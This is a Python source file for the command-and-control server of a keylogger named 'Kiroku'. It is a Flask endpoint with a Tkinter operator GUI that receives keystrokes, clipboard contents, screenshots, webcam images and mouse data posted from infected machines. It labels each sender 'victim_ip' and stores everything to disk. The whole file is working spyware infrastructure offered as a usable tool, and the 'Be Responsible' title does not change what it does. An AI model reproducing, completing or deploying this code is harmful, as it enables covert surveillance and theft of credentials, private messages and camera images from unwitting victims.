import threading
import base64
import json
import logging
import os
from datetime import datetime
from flask import Flask, request, jsonify
import tkinter as tk
from tkinter import scrolledtext, ttk
from werkzeug.serving import make_server

app = Flask(__name__)

server = None
logger = logging.getLogger()
logger.setLevel(logging.INFO)

# File paths for saving data
keystrokes_file_path = 'saved_keystrokes.txt'
clipboard_file_path = 'saved_clipboard.txt'
screenshots_dir = 'screenshots'
camera_images_dir = 'camera_images'
mouse_data_file_path = 'saved_mouse_data.txt'
connected_ips_file_path = 'connected_ips.txt'

# Create necessary directories
os.makedirs(screenshots_dir, exist_ok=True)
os.makedirs(camera_images_dir, exist_ok=True)

show_clipboard_in_logs = True
show_screenshot_logs = True
show_camera_logs = True
connected_ips = set()
data_received = 0

class GUIHandler(logging.Handler):
    def __init__(self, log_widget):
        super().__init__()
        self.log_widget = log_widget
        self.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
        self.setLevel(logging.INFO)

    def emit(self, record):
        try:
            msg = self.format(record)
            level = record.levelname
            color = self.log_widget.tag_cget(level, "foreground")

            self.log_widget.insert(tk.END, msg + '\n', level)
            self.log_widget.yview(tk.END)
        except Exception:
            self.handleError(record)

class FilterFlaskLogs(logging.Filter):
    def filter(self, record):
        return not ("POST / HTTP/1.1" in record.getMessage())

@app.route('/', methods=['POST'])
def handle_post():
    global data_received
    try:
        post_data = request.data.decode('utf-8')
        data = json.loads(post_data)

        # Extract data from the payload
        keyboard_data = data.get('keyboardData', '')
        clipboard_data = data.get('clipboardData', '')
        screenshot_base64 = data.get('screenshot', '')
        camera_image_base64 = data.get('cameraImage', '')
        mouse_data = data.get('mouseData', '')
        
        victim_ip = request.remote_addr
        if victim_ip not in connected_ips:
            logger.info(f"{victim_ip} connected")
            connected_ips.add(victim_ip)
        
        if keyboard_data:
            logger.info(f"Received Keystrokes from {victim_ip}: {keyboard_data}")
            save_to_file(keystrokes_file_path, f"{victim_ip}: {keyboard_data}")
        
        if clipboard_data:
            save_to_file(clipboard_file_path, f"{victim_ip}: {clipboard_data}")
            if show_clipboard_in_logs:
                logger.info(f"Received Clipboard Data from {victim_ip}: {clipboard_data}")

        if screenshot_base64:
            save_screenshot(screenshot_base64, victim_ip)
            if show_screenshot_logs:
                logger.info(f"Screenshot saved from {victim_ip}")

        if camera_image_base64:
            save_camera_image(camera_image_base64, victim_ip)
            if show_camera_logs:
                logger.info(f"Camera image saved from {victim_ip}")

        if mouse_data:
            save_mouse_data(mouse_data, victim_ip)
            logger.info(f"Mouse data received from {victim_ip}: {mouse_data}")

        data_received += len(post_data)
        return jsonify({'status': 'success', 'message': 'Data received and saved successfully'}), 200

    except json.JSONDecodeError as e:
        logger.error(f"JSON parsing error: {e}")
        return jsonify({'status': 'error', 'message': 'Invalid JSON'}), 400
    except Exception as e:
        logger.error(f"Server error: {e}")
        return jsonify({'status': 'error', 'message': 'Internal server error'}), 500

def save_to_file(file_path, data):
    with open(file_path, 'a') as file:
        file.write(data + '\n')

def save_screenshot(base64_data, victim_ip):
    image_data = base64.b64decode(base64_data)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    file_name = f"{victim_ip}_screenshot_{timestamp}.png"
    file_path = os.path.join(screenshots_dir, file_name)
    with open(file_path, 'wb') as file:
        file.write(image_data)

def save_camera_image(base64_data, victim_ip):
    image_data = base64.b64decode(base64_data)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    file_name = f"{victim_ip}_camera_image_{timestamp}.png"
    file_path = os.path.join(camera_images_dir, file_name)
    with open(file_path, 'wb') as file:
        file.write(image_data)

def save_mouse_data(mouse_data, victim_ip):
    save_to_file(mouse_data_file_path, f"{victim_ip}: {mouse_data}")

def load_connected_ips():
    if os.path.exists(connected_ips_file_path):
        with open(connected_ips_file_path, 'r') as file:
            return set(line.strip() for line in file)
    return set()

def run_flask():
    global server
    server = make_server('0.0.0.0', 8080, app)
    server.serve_forever()

def stop_flask():
    global server
    if server:
        server.shutdown()
        server.server_close()
        server = None

class ServerGUI:
    def __init__(self, root):
        self.root = root
        root.title("Kiroku Keylogger Server (Be Responsible - Kuraiyume)")
        root.geometry("900x700") 
        self.center_window(900, 700)
        self.notebook = ttk.Notebook(root)
        self.notebook.pack(fill='both', expand=True)

        # Logs tab
        self.log_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.log_frame, text="Logs")
        self.log_text = scrolledtext.ScrolledText(self.log_frame, width=100, height=30, wrap=tk.WORD, bg='black', fg='white')
        self.log_text.pack(padx=10, pady=10, fill='both', expand=True)
        self.log_text.tag_configure("INFO", foreground="white")
        self.log_text.tag_configure("WARNING", foreground="orange")
        self.log_text.tag_configure("ERROR", foreground="red")
        self.gui_handler = GUIHandler(self.log_text)
        logger.addHandler(self.gui_handler)

        # Control tab
        self.control_frame = ttk.Frame(self.notebook)
        self.notebook.add(self.control_frame, text="Control")
        self.start_button = ttk.Button(self.control_frame, text="Start Server", command=self.start_server)
        self.start_button.pack(pady=10)
        self.stop_button = ttk.Button(self.control_frame, text="Stop Server", command=self.stop_server, state=tk.DISABLED)
        self.stop_button.pack(pady=10)
        self.save_logs_button = ttk.Button(self.control_frame, text="Save Logs", command=self.save_logs)
        self.save_logs_button.pack(pady=10)
        self.clear_logs_button = ttk.Button(self.control_frame, text="Clear Logs", command=self.clear_logs)
        self.clear_logs_button.pack(pady=10)
        self.quit_button = ttk.Button(self.control_frame, text="Quit", command=self.quit_application)
        self.quit_button.pack(pady=10)
        
        # Clipboard logging option
        self.clipboard_check = ttk.Checkbutton(self.control_frame, text="Show Clipboard in Logs", command=self.toggle_clipboard_logging)
        self.clipboard_check.pack(pady=10)
        self.clipboard_check.state(['selected'] if show_clipboard_in_logs else ['!selected'])

        # Screenshot logging option
        self.screenshot_check = ttk.Checkbutton(self.control_frame, text="Show Screenshot Logs", command=self.toggle_screenshot_logging)
        self.screenshot_check.pack(pady=10)
        self.screenshot_check.state(['selected'] if show_screenshot_logs else ['!selected'])

        # Camera logging option
        self.camera_check = ttk.Checkbutton(self.control_frame, text="Show Camera Logs", command=self.toggle_camera_logging)
        self.camera_check.pack(pady=10)
        self.camera_check.state(['selected'] if show_camera_logs else ['!selected'])

        self.status_label = ttk.Label(self.control_frame, text="Status: Server not running")
        self.status_label.pack(pady=10)
        self.server_thread = None
        self.server_running = False
        self.notebook.select(self.control_frame)

    def start_server(self):
        if not self.server_running:
            self.server_running = True
            self.server_thread = threading.Thread(target=run_flask, daemon=True)
            self.server_thread.start()
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)
            self.status_label.config(text="Status: Server running")
            self.log("Server started.")

    def stop_server(self):
        if self.server_running:
            stop_flask()
            self.server_running = False
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            self.status_label.config(text="Status: Server not running")
            self.log("Server stopped.")

    def save_logs(self):
        with open("logs.txt", "w") as log_file:
            log_file.write(self.log_text.get(1.0, tk.END))
        self.log("Logs saved to logs.txt.")

    def clear_logs(self):
        self.log_text.delete(1.0, tk.END)
        self.log("Logs cleared.")

    def quit_application(self):
        stop_flask()
        self.root.quit()

    def toggle_clipboard_logging(self):
        global show_clipboard_in_logs
        show_clipboard_in_logs = not show_clipboard_in_logs
        self.log("Clipboard logging " + ("enabled." if show_clipboard_in_logs else "disabled."))

    def toggle_screenshot_logging(self):
        global show_screenshot_logs
        show_screenshot_logs = not show_screenshot_logs
        self.log("Screenshot logging " + ("enabled." if show_screenshot_logs else "disabled."))

    def toggle_camera_logging(self):
        global show_camera_logs
        show_camera_logs = not show_camera_logs
        self.log("Camera logging " + ("enabled." if show_camera_logs else "disabled."))

    def log(self, message):
        logger.info(message)

    def center_window(self, width, height):
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        x = (screen_width // 2) - (width // 2)
        y = (screen_height // 2) - (height // 2)
        self.root.geometry(f"{width}x{height}+{x}+{y}")

if __name__ == "__main__":
    root = tk.Tk()
    server_gui = ServerGUI(root)
    root.protocol("WM_DELETE_WINDOW", server_gui.quit_application)
    root.mainloop()
